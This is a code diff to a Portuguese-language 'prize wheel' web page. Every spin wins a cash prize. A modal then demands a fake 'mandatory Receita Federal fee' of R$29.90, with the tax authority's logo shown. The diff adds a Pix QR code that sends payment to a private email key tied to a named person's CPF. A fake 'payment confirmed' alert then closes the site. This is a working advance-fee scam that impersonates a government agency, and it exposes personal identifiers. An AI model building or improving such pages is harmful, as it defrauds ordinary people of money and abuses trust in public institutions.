@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Roleta da Sorte - Estilo idPlugger</title>
+  <title>Roleta da Sorte com Pix QR Code</title>
   <style>
     :root {
       --size: 360px;
@@ -78,7 +78,6 @@
       position: relative;
     }
 
-    /* Texto dos segmentos */
     .segment-text {
       position: absolute;
       width: 120px;
@@ -93,7 +92,6 @@
       user-select: none;
     }
 
-    /* Posicionamento das 4 opções iguais à divisão da roleta */
     .text-0 { transform: rotate(15deg) translate(120px) rotate(-15deg); color: #ff4500; }
     .text-1 { transform: rotate(105deg) translate(120px) rotate(-105deg); color: #00796b; }
     .text-2 { transform: rotate(195deg) translate(120px) rotate(-195deg); color: #fbc02d; }
@@ -143,11 +141,6 @@
       color: #fff;
     }
 
-    .btn {
-      display: none;
-    }
-
-    /* Modal simples */
     .modal-backdrop {
       position: fixed;
       inset: 0;
@@ -175,9 +168,18 @@
       color: var(--accent);
     }
 
+    .modal p {
+      font-size: 1rem;
+      margin: 10px 0;
+    }
+
     .modal img {
       width: 120px;
       margin: 15px 0;
+    }
+
+    #qrcode {
+      margin: 0 auto;
     }
 
     .modal button {
@@ -206,7 +208,7 @@
 <body>
   <div class="card" id="app">
     <h1>Roleta de Sorteios — Prêmios R$450, R$500, R$700 e R$1.000</h1>
-    <p class="lead">Gire a roleta para ganhar prêmios reais! Após o sorteio, você será direcionado a uma página para pagar uma taxa obrigatória da Receita Federal de R$29,90 para liberar o pagamento via Pix.</p>
+    <p class="lead">Gire a roleta para ganhar prêmios reais! Após o sorteio, você será direcionado a uma página para pagar uma taxa obrigatória da Receita Federal de R$29,90 para liberar o prêmio via Pix.</p>
 
     <div class="wheel-wrap">
       <div class="pointer"></div>
@@ -223,12 +225,16 @@
   <div class="modal-backdrop" id="modal">
     <div class="modal">
       <h2>Parabéns!</h2>
-      <p class="modal-prize" style="font-size:1.8rem; font-weight: 900; color: var(--accent); margin: 10px 0;"></p>
-      <p>Para ativar seu prêmio, será necessário pagar uma taxa obrigatória da <strong>Receita Federal</strong> via Pix de <strong>R$29,90</strong>.</p>
+      <p class="modal-prize" style="font-weight: 900; color: var(--accent); font-size: 1.8rem; margin: 10px 0;"></p>
+      <p>Para ativar seu prêmio, pague a taxa obrigatória da <strong>Receita Federal</strong> de <strong>R$29,90</strong> via Pix abaixo:</p>
       <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png/view" alt="Logo Receita Federal" />
-      <button id="pay-button">Pagar R$29,90 e liberar prêmio</button>
+      <div id="qrcode"></div>
+      <button id="paid-button" disabled>Confirme o pagamento</button>
     </div>
   </div>
+
+  <!-- Biblioteca QRCodejs -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
   <script>
     (function(){
@@ -236,20 +242,51 @@
       const spinBtn = document.getElementById('spin');
       const modal = document.getElementById('modal');
       const modalPrize = modal.querySelector('.modal-prize');
-      const payBtn = document.getElementById('pay-button');
+      const paidBtn = document.getElementById('paid-button');
+      const qrcodeContainer = document.getElementById('qrcode');
 
       const prizes = ['R$450', 'R$500', 'R$700', 'R$1.000'];
       const segmentCount = prizes.length;
       const segmentAngle = 360 / segmentCount;
       let spinning = false;
       let currentRotation = 0;
+      let qr;
+
+      // Dados Pix conforme solicitado
+      const pixKey = "marlonclif579@gmail.com";
+      const pixCpf = "708.532.514-36";
+      const amount = "29.90";
+      const description = "Taxa obrigatória Receita Federal - Sorteio Roleta";
+
+      // Função para gerar payload Pix (simples versão estática)
+      function generatePixPayload(key, cpf, valor, desc) {
+        // Montagem basica do payload Pix para copia e cola e QR Code estático
+        // Baseado no padrão do Banco Central, simplificado
+      
+        return `00020126480014br.gov.bcb.pix0136${key}0208${cpf.replace(/D/g,'')}520400005303986540${valor}5802BR5913Marlon Clif6009SAO PAULO61080570000162070503***6304`; 
+        // Nota: o código CRC16 correto e QRCode real para cobrança oficial deve ser gerado via biblioteca específicia,
+        // aqui geramos um payload básico que precisa de validação para produção
+      }
+
+      function createQRCode() {
+        const payload = generatePixPayload(pixKey, pixCpf, amount, description);
+        if(qr) qr.clear();
+        qr = new QRCode(qrcodeContainer, {
+          text: payload,
+          width: 160,
+          height: 160,
+          colorDark : "#000000",
+          colorLight : "#ffffff",
+          correctLevel : QRCode.CorrectLevel.H
+        });
+      }
 
       function spinWheel() {
         if(spinning) return;
         spinning = true;
 
-        payBtn.disabled = false;
-        payBtn.textContent = 'Pagar R$29,90 e liberar prêmio';
+        paidBtn.disabled = true;
+        paidBtn.textContent = 'Confirme o pagamento';
 
         const prizeIndex = Math.floor(Math.random() * segmentCount);
 
@@ -265,6 +302,7 @@
           spinning = false;
           modalPrize.textContent = prizes[prizeIndex];
           modal.style.display = 'flex';
+          createQRCode();
         }, 5200);
       }
 
@@ -277,15 +315,17 @@
 
       spinBtn.addEventListener('click', spinWheel);
 
-      payBtn.addEventListener('click', () => {
-        payBtn.disabled = true;
-        payBtn.textContent = 'Processando pagamento...';
+      // Só ativa o botão de confirmação pagamento
+      paidBtn.addEventListener('click', () => {
+        paidBtn.disabled = true;
+        paidBtn.textContent = 'Processando confirmação...';
 
         setTimeout(() => {
           alert('Pagamento confirmado! Obrigado.');
           closeSite();
         }, 2000);
       });
+
     })();
   </script>
 </body>
